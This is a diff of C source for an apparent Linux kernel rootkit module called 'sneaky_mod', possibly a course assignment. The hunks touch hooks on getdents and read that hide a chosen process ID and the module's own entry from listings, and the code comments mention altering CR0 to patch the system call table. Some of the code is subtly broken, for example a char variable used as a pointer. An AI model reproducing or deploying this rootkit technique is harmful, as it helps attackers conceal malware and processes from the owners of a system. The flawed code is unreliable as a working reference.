@@ -8,8 +8,6 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-#include <stdio.h>
-#include <stdlib.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Kaidi Lyu");
@@ -25,6 +23,20 @@ struct linux_dirent
     unsigned short d_reclen;
     char d_name[];
 };
+
+char* itoa(int val, int base){
+
+  static char buf[32] = {0};
+
+  int i = 30;
+
+  for(; val && i ; --i, val /= base)
+
+    buf[i] = "0123456789abcdef"[val % base];
+
+  return &buf[i+1];
+
+}
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -73,9 +85,10 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
     int originalRes = original_getdents(fd, dirp, count);
-    char pidString[1024];
-    itoa(pid, pidString, 10);
-    for (int currNum = 0; currNum < originalRes;)
+    char* pidString;
+    pidString = itoa(pid, 10);
+    int currNum = 0;
+    for (currNum; currNum < originalRes;)
     {
         struct linux_dirent *tmp = dirp + currNum;
         int currSize = tmp->d_reclen;
@@ -103,9 +116,9 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
     char *start, end;
     if ((start = strstr(buf, "sneaky_mod")) != NULL)
     {
-        if ((end = strstr(start, "\n")) != NULL)
+        if ((end = strchr(start, '\n')) != NULL)
         {
-            memmove(start, end + 1, originalRes + nuf - end - 1);
+            memmove(start, end + 1, originalRes + buf - end - 1);
             originalRes = originalRes - end - 1 + start;
         }
     }
